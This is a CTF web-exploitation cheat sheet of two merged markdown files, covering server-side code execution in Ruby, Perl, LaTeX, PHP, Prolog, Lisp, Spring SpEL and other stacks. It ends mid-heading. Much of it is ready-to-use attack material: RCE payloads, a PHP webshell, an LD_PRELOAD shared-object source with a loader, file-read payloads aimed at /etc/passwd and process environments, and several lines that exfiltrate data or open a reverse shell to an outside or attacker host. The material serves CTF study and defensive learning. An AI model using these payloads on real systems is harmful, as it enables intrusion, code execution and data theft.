# CTF Web - Server-Side Code Execution & Access Attacks

## Table of Contents
- [Ruby Code Injection](#ruby-code-injection)
  - [instance_eval Breakout](#instance_eval-breakout)
  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
  - [Exfiltration](#exfiltration)
- [Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)](#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016)
- [Perl open() RCE](#perl-open-rce)
- [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
- [PHP preg_replace /e Modifier RCE (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
- [PHP Backtick Eval Under Character Limit (EasyCTF 2017)](#php-backtick-eval-under-character-limit-easyctf-2017)
- [PHP assert() String Evaluation Injection (CSAW CTF 2016)](#php-assert-string-evaluation-injection-csaw-ctf-2016)
- [Prolog Injection (PoliCTF 2015)](#prolog-injection-polictf-2015)
- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
- [File Upload to RCE Techniques](#file-upload-to-rce-techniques)
  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
  - [PHP Log Poisoning](#php-log-poisoning)
  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
  - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
  - [ZipSlip + SQLi](#zipslip--sqli)
- [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
- [PHP extract() / register_globals Variable Overwrite (SecuInside 2013)](#php-extract--register_globals-variable-overwrite-secuinside-2013)
- [XPath Blind Injection (BaltCTF 2013)](#xpath-blind-injection-baltctf-2013)
- [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
- [WebSocket Mass Assignment](#websocket-mass-assignment)
- [Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)](#thymeleaf-spel-ssti--spring-filecopyutils-waf-bypass-apoorvctf-2026)
- [PHP eval() Function-Regex Bypass via current(getallheaders()) (RCTF 2018)](#php-eval-function-regex-bypass-via-currentgetallheaders-rctf-2018)
- [Python f-string Format Injection Blind Extraction (Meepwn CTF Quals 2018)](#python-f-string-format-injection-blind-extraction-meepwn-ctf-quals-2018)

For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

*See also: [server-side-exec-2.md](server-side-exec-2.md) for SQLi keyword fragmentation bypass, SQL WHERE ORDER BY bypass, SQL injection via DNS records, bash brace expansion, Common Lisp reader macro injection, PHP7 OPcache + LD_PRELOAD bypass, wget filename trick, tar filename injection, PNG/PHP polyglot upload, editor backup file disclosure, date -f file read, Apache mod_rewrite bypass, and PHP ReDoS code skip.*

---

## Ruby Code Injection

### instance_eval Breakout
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

### Bypassing Keyword Blocklists
| Blocked | Alternative |
|---------|-------------|
| `File.read` | `Kernel#open` or class helper methods |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

### Exfiltration
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

**Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.

---

## Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)

In Ruby sandbox challenges where direct variable access is blocked, use `ObjectSpace.each_object` to scan the entire heap for flag strings.

```ruby
# When you can't access the flag variable directly:
# Method 1: ObjectSpace heap scan
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }

# Method 2: Monkey-patch to access private methods
# If object 'p' has private method 'flag':
def p.x; flag end; p.x

# Method 3: Use send() to bypass private visibility
p.send(:flag)

# Method 4: Use method() to get method object
p.method(:flag).call
```

**Key insight:** Ruby's `ObjectSpace.each_object(String)` iterates every live String in the Ruby heap, including those stored in private variables or internal state. Filter by known flag prefix to extract the flag even when no direct reference exists.

---

## Perl open() RCE
Legacy 2-argument `open()` allows command injection:
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

**Key insight:** Perl's 2-argument `open()` interprets mode characters in the filename itself. A leading or trailing pipe (`|`) causes command execution. Any Perl CGI or backend that opens a user-supplied filename with the 2-arg form is vulnerable to RCE.

---

## LaTeX Injection RCE (Hack.lu CTF 2012)

**Pattern:** Web applications that compile user-supplied LaTeX (PDF generation services, scientific paper renderers) allow command execution via `\input` with pipe syntax.

**Read files:**
```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**Execute commands:**
```latex
\input{|"id"}
\input{|"ls /home/"}
\input{|"cat /flag.txt"}
```

**Full payload as standalone document:**
```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

**Key insight:** LaTeX's `\input{|"cmd"}` syntax pipes shell command output directly into the document. The `\@@input` internal macro reads files without shell invocation. Use `\catcode` adjustments to handle special characters (underscores, braces) in command output.

**Detection:** Any endpoint accepting `.tex` input, PDF preview/compile services, or "render LaTeX" functionality.

---

## Server-Side JS eval Blocklist Bypass

**Bypass via string concatenation in bracket notation:**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, reverse string
```

**Key insight:** JavaScript `eval` blocklists filtering keywords like `require`, `process`, or `constructor` are bypassed with string concatenation in bracket notation. `['con'+'structor']` accesses `Function` constructor, which creates functions from strings -- equivalent to `eval` with no keyword to block.

---

## PHP preg_replace /e Modifier RCE (PlaidCTF 2014)

**Pattern:** PHP's `preg_replace()` with the `/e` modifier evaluates the replacement string as PHP code. Combined with `unserialize()` on user-controlled input, craft a serialized object whose properties trigger a code path using `preg_replace("/pattern/e", "system('cmd')", ...)`.

```php
// Vulnerable code pattern:
preg_replace($pattern . "/e", $replacement, $input);
// If $replacement is attacker-controlled:
$replacement = 'system("cat /flag")';
```

**Via object injection (POP chain):**
```php
// Craft serialized object with OutputFilter containing /e pattern
$filter = new OutputFilter("/^./e", 'system("cat /flag")');
$cookie = serialize($filter);
// Send as cookie → unserialize triggers preg_replace with /e
```

**Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.

---

## PHP Backtick Eval Under Character Limit (EasyCTF 2017)

**Pattern:** PHP backtick operator executes shell commands. When `eval()` input has a character limit, backticks provide shell execution in minimal characters.

```php
// 11-character RCE via eval()
echo`cat *`;

// 8-character directory listing
echo`ls`;

// 10-character parameterized command execution
`$_GET[0]`;

// 12-character reverse shell trigger
`$_GET[x]`;
// Then pass the full command via GET parameter: ?x=bash -i >& /dev/tcp/attacker/4444 0>&1
```

**Character count comparison:**
```text
echo`cat *`;              // 12 chars - read all files
echo`ls`;                 // 9 chars  - list directory
`$_GET[0]`;               // 11 chars - parameterized execution
system('id');             // 13 chars - standard approach
exec('id');               // 11 chars - also standard
```

**Key insight:** PHP backticks are equivalent to `shell_exec()`. When `eval()` input has a character limit, `` echo`cmd` `` provides shell execution in as few as 8 characters. The `$_GET[0]` trick moves the actual payload to a URL parameter, effectively bypassing the character limit entirely while keeping the eval payload minimal.

---

## PHP assert() String Evaluation Injection (CSAW CTF 2016)

PHP's `assert()` evaluates string arguments as PHP code. When user input is concatenated into assert(), it enables code injection.

```php
// Vulnerable code pattern:
assert("strpos('$page', '..') === false");

// Injection payload via $page parameter:
// ' and die(show_source('templates/flag.php')) or '
// Results in: assert("strpos('' and die(show_source('templates/flag.php')) or '', '..') === false");

// URL: ?page=' and die(show_source('templates/flag.php')) or '
// Alternative payloads:
// ' and die(system('cat /flag')) or '
// '.die(highlight_file('config.php')).'
```

**Key insight:** PHP `assert()` with string arguments acts like `eval()`. This was deprecated in PHP 7.2 and removed in PHP 8.0, but legacy applications remain vulnerable. Look for `assert()` in source code (especially via exposed `.git` directories).

---

## Prolog Injection (PoliCTF 2015)

**Pattern:** Service passes user input directly into a Prolog predicate call. Close the original predicate and inject additional Prolog goals for command execution.

```text
# Original query: hanoi(USER_INPUT)
# Injection: close hanoi(), chain exec()
3), exec(ls('/')), write('\n'
3), exec(cat('/flag')), write('\n'
```

**Identification:** Error messages containing "Prolog initialisation failed" or "Operator expected" reveal the backend. SWI-Prolog's `exec/1` and `shell/1` execute system commands.

**Key insight:** Prolog goals are chained with `,` (AND). Injecting `3), exec(cmd)` closes the original predicate and appends arbitrary Prolog goals. Similar to SQL injection but for logic programming backends. Also check for `process_create/3` and `read_file_to_string/3` as alternatives to `exec`.

---

## ReDoS as Timing Oracle

**Pattern (0xClinic):** Match user-supplied regex against file contents. Craft exponential-backtracking regexes that trigger only when a character matches.

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

**Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.

---

## File Upload to RCE Techniques

**Key insight:** File upload vulnerabilities become RCE when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.

### .htaccess Upload Bypass
1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
3. Access `rce.lol?cmd=cat+flag.txt`

### PHP Log Poisoning
1. PHP payload in User-Agent header
2. Path traversal to include: `....//....//....//var/log/apache2/access.log`

### Python .so Hijacking (by Siunam)
1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

### Gogs Symlink RCE (CVE-2025-8110)
1. Create repo, `ln -s .git/config malicious_link`, push
2. API update `malicious_link` → overwrites `.git/config`
3. Inject `core.sshCommand` with reverse shell

### ZipSlip + SQLi
Upload zip with symlinks for file read, path traversal for file write.

---

## PHP Deserialization from Cookies
```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```
Replace cookie with base64-encoded malicious serialized data.

**Key insight:** PHP cookies containing base64-encoded data are likely `unserialize()` targets. Craft a serialized object with a `path` property pointing to `flag.txt` or inject a POP chain for RCE. Decode the existing cookie first to identify the class name and property structure.

---

## PHP extract() / register_globals Variable Overwrite (SecuInside 2013)

**Pattern:** `extract($_GET)` or `extract($_POST)` overwrites internal PHP variables with user-supplied values, enabling database credential injection, path manipulation, or authentication bypass.

```php
// Vulnerable pattern
if (!ini_get("register_globals")) extract($_GET);
// Attacker-controlled: $_BHVAR['db']['host'], $_BHVAR['path_layout'], etc.
```

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

**Key insight:** `extract()` imports array keys as local variables. Overwrite database connection parameters to point to an attacker-controlled MySQL server, then return crafted query results (file paths, credentials, etc.).

**Detection:** Search source for `extract($_GET)`, `extract($_POST)`, `extract($_REQUEST)`. PHP `register_globals` (removed in 5.4) had the same effect globally.

---

## XPath Blind Injection (BaltCTF 2013)

**Pattern:** XPath queries constructed from user input enable blind data extraction via boolean-based or content-length oracles.

```text
-- Injection in sort/filter parameter:
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2

-- Boolean detection: response length > threshold = true
-- Extract character by character:
for pos in range(1, 100):
    for c in string.printable:
        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': payload}).text) > 1050:
            result += c; break
```

**Key insight:** XPath injection is similar to SQL injection but targets XML data stores. `normalize-space()` strips whitespace, `../../../` traverses the XML tree. Boolean oracle via response size differences (true queries return more results).

---

## API Filter/Query Parameter Injection

**Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

## HTTP Response Header Data Hiding

Proof/flag in custom response headers (e.g., `x-archive-tag`, `x-flag`):
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

**Key insight:** Flags and proof codes hidden in custom HTTP response headers (e.g., `x-flag`, `x-archive-tag`) are invisible in browser-rendered responses. Always inspect response headers with `curl -sI` or browser dev tools, especially for API endpoints.

---

## WebSocket Mass Assignment
```json
{"username": "user", "isAdmin": true}
```
Handler doesn't filter fields → privilege escalation.

**Key insight:** WebSocket handlers that directly map JSON properties to objects without whitelisting allow mass assignment. Add privileged fields like `isAdmin`, `role`, or `balance` to the JSON payload -- if the server doesn't explicitly filter them, they overwrite the corresponding object properties.

---

## Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF Bypass (ApoorvCTF 2026)

**Pattern (Sugar Heist):** Spring Boot app with Thymeleaf template preview endpoint. WAF blocks standard file I/O classes (`Runtime`, `ProcessBuilder`, `FileInputStream`) but not Spring framework utilities.

**Attack chain:**
1. **Mass assignment** to gain admin role (add `"role": "ADMIN"` to registration JSON)
2. **SpEL injection** via template preview endpoint
3. **WAF bypass** using `org.springframework.util.FileCopyUtils` instead of blocked classes

```bash
# Step 1: Register as admin via mass assignment
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# Step 2: Directory listing via SpEL (java.io.File not blocked)
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# Step 3: Read flag using Spring FileCopyUtils + string concat to bypass WAF
curl -X POST http://target/api/admin/preview \
  -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

**Key insight:** Distroless containers have no shell (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.

**Alternative SpEL file read payloads:**
```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.

---

## PHP eval() Function-Regex Bypass via current(getallheaders()) (RCTF 2018)

**Pattern (calc):** A PHP sandbox passes user input to `eval()` only after a recursive regex `/[^\W_]+\((?R)?\)/` verifies the string contains a single function call (identifier + parentheses). The filter rejects underscores, digits-before-letter, and multi-statement bodies, which kills obvious payloads like `system($_GET[...])`.

**Bypass:** `current(getallheaders())` is a single bare function-call expression that passes the regex. At runtime it returns the first HTTP header value — an arbitrary attacker-controlled string — which can then be passed into a second nested `eval` or `assert`.

```bash
curl "http://target/?cmd=eval(current(getallheaders()));" \
     -H "Zzz: system('cat /flag');"
```

- `getallheaders()` returns an associative array of the request headers.
- `current()` extracts the first element (PHP's header order is stable enough to force your header to index 0 by sending it first or using a name like `Zzz` that wins alphabetical ties).
- The outer `eval` consumes the returned string and executes it.

**Key insight:** Any regex filter that only inspects the *form* of an expression (function-name + parens) can be broken by functions whose return values become the next payload. Focus on PHP functions that read attacker-controlled storage (`getallheaders`, `get_defined_vars`, `file_get_contents('php://input')`, `current($_SERVER)`) — they let you smuggle arbitrary strings past syntactic filters.

**References:** RCTF 2018 — writeup 10150

---

## Python f-string Format Injection Blind Extraction (Meepwn CTF Quals 2018)

**Pattern:** A Python 3.6+ application evaluates user-controlled content inside an f-string template (`f"... {user} ..."`). Explicit quotes are filtered, so `{FLAG}` returns the flag's `repr()` but the attacker cannot concatenate strings or call functions with string arguments.

**Bypass — boolean short-circuit + format spec:**
```python
# The f-string spec lets you use comparisons and arithmetic inside {}.
# `FLAG > 'c'` evaluates to True or False depending on lexicographic order.
# `True or 14` short-circuits to True; False triggers the fallback 14 which
# is then formatted as hex ('e'). This turns the template into a one-bit
# oracle that reveals 'FLAG[0] > c' per request.
payload = "{FLAG>'c' or 14:x}"
# Request returns "True" or "e" — the attacker reads one comparison bit.
```

Iterate the comparison character to binary-search each byte of `FLAG` without ever emitting a forbidden quote outside the template.

**Key insight:** f-strings evaluate full Python expressions inside `{}`. Any filter that only looks at the surrounding source (e.g., "no quotes, no `__class__`") fails because the expression can use identifiers already in scope, comparisons, and the format-spec `:x`/`:b`/`:c` conversions to turn any value into attacker-readable output. When direct string manipulation is banned, use comparisons against pre-existing constants or against other variables and read the result bit-by-bit.

**References:** Meepwn CTF Quals 2018 — writeups 10433, 10434

---

*See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*

<!-- merged: webapp/injection/server-side-exec.md -->

# CTF Web - Server-Side Code Execution & Access Attacks (Part 2)

## Table of Contents
- [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
- [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
- [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
- [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
- [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
- [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
- [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
- [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
- [PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)](#php-bmp-pixel-webshell-with-filename-truncation-nuit-du-hack-ctf-2018)
- [Editor Backup File Source Disclosure (h4ckc0n 2017)](#editor-backup-file-source-disclosure-h4ckc0n-2017)
- [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
- [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
- [PHP ReDoS to Skip Code Execution (CODE BLUE 2017)](#php-redos-to-skip-code-execution-code-blue-2017)
- [Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)](#custom-serializer-integer-overflow-256-to-0-length-codegate-2018)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Unanchored Regex Command Injection (picoCTF 2018)](#unanchored-regex-command-injection-picoctf-2018)
- [Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)](#jinja2-ssti-via-globals__self__exec-string-concat-bypass-inctf-2018)
- [web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)](#webpy-reparam-eval--__subclasses__-with-blanked-builtins-hitcon-2018)
- [Redis Lua Injection via redis.call() (HumanCTF 2018)](#redis-lua-injection-via-rediscall-humanctf-2018)
- [PHP create_function String Interpolation RCE (FireShell 2019)](#php-create_function-string-interpolation-rce-fireshell-2019)
- [php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)](#phpinput--null-byte--bitwise-base64-filter-bypass-defcamp-2018)
- [EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)](#exif-imagedescription-shell-injection-via-exiftool-otw-advent-2018)
- [.phar Extension Bypass for PHP Upload Blacklists (35C3 2018)](#phar-extension-bypass-for-php-upload-blacklists-35c3-2018)
- [vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)](#vsftpd-234-smiley-face-backdoor-pwn-ctf-2018)

For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

*See also: [server-side-exec.md](server-side-exec.md) for Ruby/Perl/JS code injection, LaTeX injection RCE, PHP preg_replace /e RCE, PHP backtick eval, PHP assert() injection, Prolog injection, ReDoS timing oracle, file upload to RCE (.htaccess, log poisoning, Python .so hijack, Gogs symlink, ZipSlip), PHP deserialization from cookies, PHP extract() variable overwrite, XPath blind injection, API filter injection, HTTP response header hiding, WebSocket mass assignment, and Thymeleaf SpEL SSTI.*

---

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

**Pattern:** Single-pass `preg_replace()` keyword filters can be bypassed by nesting the stripped keyword inside the payload word.

**Key insight:** If the filter strips `load_file` in a single pass, `unload_fileon` becomes `union` after removal. The inner keyword acts as a sacrificial fragment.

```php
// Vulnerable filter (single-pass, case-sensitive)
$str = preg_replace("/union/", "", $str);
$str = preg_replace("/select/", "", $str);
$str = preg_replace("/load_file/", "", $str);
$str = preg_replace("/ /", "", $str);
```

```sql
-- Bypass payload (spaces replaced with /**/ comments)
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
-- Or nest the stripped keyword:
unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
```

**Variations:** Case-sensitive filters: mix case (`unIoN`). Space filters: `/**/`, `%09`, `%0a`. Recursive filters: double the keyword (`ununionion`). Always test whether the filter is single-pass or recursive.

---

## SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)

When `WHERE` clause restrictions prevent direct filtering, use `ORDER BY CASE` to control result ordering and extract data:

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

**Key insight:** Even without WHERE access, ORDER BY with conditional expressions forces target rows to appear first in results. Combine with `LIMIT 1` to isolate specific records.

---

## SQL Injection via DNS Records (PlaidCTF 2014)

**Pattern:** Application calls `gethostbyaddr()` or `dns_get_record()` on user-controlled IP addresses and uses the result in SQL queries without escaping. Inject SQL through DNS PTR or TXT records you control.

**Attack setup:**
1. Set your IP's PTR record to a domain you control (e.g., `evil.example.com`)
2. Add a TXT record on that domain containing the SQL payload
3. Trigger the application to resolve your IP (e.g., via password reset)

```php
// Vulnerable code:
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$details = dns_get_record($hostname);
mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
// TXT record: "' UNION SELECT flag FROM flags-- "
```

**Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.

---

## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)

When spaces and common shell metacharacters (`$`, `&`, `\`, `;`, `|`, `*`) are filtered, use bash brace expansion and process substitution:

```bash
# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
{ls,-la,../..}

# Exfiltrate via UDP when outbound TCP is blocked:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# Execute base64-encoded payload:
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**Key insight:** Bash brace expansion `{a,b,c}` splits into space-separated tokens without requiring literal space characters. Combined with `/dev/udp/` or `/dev/tcp/` for exfiltration, this bypasses filters that block spaces and most shell metacharacters.

---

## Common Lisp Injection via Reader Macro (Insomnihack 2016)

Lisp's `read` function evaluates `#.(expression)` reader macros at parse time. When an application uses `read` for user input (instead of `read-line`), arbitrary code execution is possible:

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

**Key insight:** Lisp's `read` treats data as code by design -- the `#.()` reader macro evaluates arbitrary expressions during parsing. This is analogous to SQL injection but for Lisp. Safe alternative: use `read-line` for string input, never `read` on untrusted data.

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) for full exploit code.

---

## Java Deserialization (ysoserial)

Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use ysoserial gadget chains (CommonsCollections, URLDNS for blind detection). See [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial) for payloads and bypass techniques.

---

## Python Pickle Deserialization

`pickle.loads()` calls `__reduce__()` for instant RCE via `(os.system, ('cmd',))`. Common in Flask sessions, ML model files, Redis objects. See [server-side-deser.md](server-side-deser.md#python-pickle-deserialization) for payloads and restricted unpickler bypasses.

---

## Race Conditions (Time-of-Check to Time-of-Use)

Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-time-of-check-to-time-of-use) for async exploit code and detection patterns.

---

---

## PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)

**Pattern (Homework):** Multi-stage chain: SQLi file write + PHP7 OPcache poisoning + `LD_PRELOAD` bypass of `disable_functions`.

**Stage 1 — OPcache poisoning:**
PHP7 with `opcache.file_cache` enabled stores compiled bytecode in `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`. Replace the `.bin` file via SQLi `INTO DUMPFILE` to execute arbitrary PHP despite upload restrictions.

```bash
# 1. Calculate system_id from phpinfo() data
python3 system_id_scraper.py http://target/phpinfo.php
# Output: 39b005ad77428c42788140c6839e6201

# 2. Generate opcode cache locally (match PHP version)
php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
    -d opcache.file_cache_only=1 -f payload.php

# 3. Patch system_id in binary (bytes 9-40)
# 4. Upload via SQLi INTO DUMPFILE:
```
```sql
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
```

**Stage 2 — LD_PRELOAD bypass:**
When `disable_functions` blocks all exec functions, use `putenv()` + `mail()` to execute code. PHP's `mail()` calls external sendmail, which respects `LD_PRELOAD`.

```c
/* evil.c — compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

```php
<?php
// payload.php — upload evil.so via webapp, deploy this via OPcache
putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**Key insight:** PHP's `disable_functions` only restricts PHP-level calls. External programs spawned by `mail()` run without PHP restrictions, and `LD_PRELOAD` lets you override any libc function in those external programs. The OPcache `.bin` file has no integrity check beyond `system_id` matching — replacing it with a crafted binary gives arbitrary PHP execution even when upload validation strips PHP content.

---

## Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)

